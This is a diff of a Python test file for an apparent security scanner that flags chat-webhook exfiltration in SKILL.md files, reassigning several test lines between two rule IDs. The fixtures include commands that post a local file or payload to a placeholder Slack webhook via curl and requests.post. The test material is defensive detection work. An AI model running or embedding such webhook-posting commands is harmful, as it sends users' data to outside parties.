@@ -91,14 +91,17 @@ class StringExpressions(Folder):
 
     def test_a_standalone_chat_url_is_still_a_chat_webhook(self):   # guard
         for line in ("```python\nrequests.post('" + HOOK + "', json=payload)\n```",
-                     "```python\nrequests.request('POST', '" + HOOK + "', json=payload)\n```",
-                     "```python\nurl = '" + HOOK + "'\n```",
-                     "```json\n{\"webhook\": \"https://hooks.slack.com/services/T0/B0/FAKE\"}\n```",
                      "Post it:\n```\ncurl -X POST -d @d.json \\\n  'https://hooks.slack.com/services/T0/B0/FAKE'\n```",
-                     "Post it: `curl -X POST -d @d.json https://hooks.slack.com/services/T0/B0/FAKE`",
-                     "Docs: [our hook](https://hooks.slack.com/services/T0/B0/FAKE)"):
+                     "Post it: `curl -X POST -d @d.json https://hooks.slack.com/services/T0/B0/FAKE`"):
             fs = wt.scan_text(HEAD + line + "\n", "/s/SKILL.md", wt.load_rules())
             self.assertEqual({f["rule"] for f in fs} & {"WT-T005", "WT-T018"}, {"WT-T018"}, line)
+        # batch 7b: not one literal passed straight to a recognised send (were WT-T018)
+        for line in ("```python\nrequests.request('POST', '" + HOOK + "', json=payload)\n```",
+                     "```python\nurl = '" + HOOK + "'\n```",
+                     "```json\n{\"webhook\": \"https://hooks.slack.com/services/T0/B0/FAKE\"}\n```",
+                     "Docs: [our hook](https://hooks.slack.com/services/T0/B0/FAKE)"):
+            fs = wt.scan_text(HEAD + line + "\n", "/s/SKILL.md", wt.load_rules())
+            self.assertEqual({f["rule"] for f in fs} & {"WT-T005", "WT-T018"}, {"WT-T005"}, line)
 
 
 # ---------------------------------------------------------------- high 2: the findings cap limits what is kept, never what is read
